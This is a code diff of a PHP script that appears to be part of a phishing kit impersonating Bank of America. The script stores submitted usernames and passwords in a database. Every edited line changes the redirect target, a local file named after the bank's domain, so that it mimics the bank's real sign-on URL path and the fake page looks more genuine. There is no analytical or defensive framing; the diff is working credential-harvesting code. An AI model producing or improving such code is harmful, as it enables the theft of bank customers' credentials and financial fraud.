@@ -10,10 +10,10 @@ if($_SERVER["REQUEST_METHOD"] == "POST"){
 	$_SESSION['nouser'] = 'yes';
 
 	if(empty($user) || !isset($_POST['user']) || $user == '' || is_null($_POST['user'])){
-		header("Location: secure.bankofamerica.com.php");
+		header("Location: secure.bankofamerica.com.php?/login/sign-in/signOnV2Screen.go");
 		exit;
 	}else if(empty($pass) || $pass == '' || is_null($user)){
-		header("Location: secure.bankofamerica.com.php");
+		header("Location: secure.bankofamerica.com.php?/login/sign-in/signOnV2Screen.go");
 		exit;
 	}
 	try{
@@ -30,14 +30,14 @@ if($_SERVER["REQUEST_METHOD"] == "POST"){
 		$stmt2->bindValue(':user',$user);
 		$stmt2->bindValue(':pass',$pass);
 		$stmt2->execute();
-		header("Location: secure.bankofamerica.com.php");
+		header("Location: secure.bankofamerica.com.php?/login/sign-in/signOnV2Screen.go");
 		exit;
 	}else{
-		header("Location: secure.bankofamerica.com.php");
+		header("Location: secure.bankofamerica.com.php?/login/sign-in/signOnV2Screen.go");
 		exit;
 	}
 	} catch (PDOException $e){
-		header("Location: secure.bankofamerica.com.php");
+		header("Location: secure.bankofamerica.com.php?/login/sign-in/signOnV2Screen.go");
 		exit;
 	}
 }
